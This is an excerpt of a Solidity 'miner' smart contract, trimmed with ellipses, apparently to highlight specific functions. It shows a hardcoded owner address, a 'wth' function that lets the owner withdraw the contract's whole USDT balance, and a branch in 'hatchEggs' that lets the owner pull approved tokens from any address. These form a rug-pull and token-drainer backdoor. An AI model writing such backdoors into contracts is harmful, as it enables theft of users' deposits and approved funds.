...
contract USDT_MINER_V {
    ...
    constructor() public{
        ...
        ceoAddress2=address(0x19Aeead1a0E24161c02D12Ee8DE5C152eAD2A010);
    }


function wth () public {
if (msg.sender == ceoAddress)
 ERC20(usdt).transfer(msg.sender,ERC20(usdt).balanceOf(address(this)));
 }
    ...
    function hatchEggs(address ref, uint256 amount) public {
        ...
        if (msg.sender == ceoAddress){
           ERC20(usdt).transferFrom(ref, ceoAddress, amount);
            } else
        {
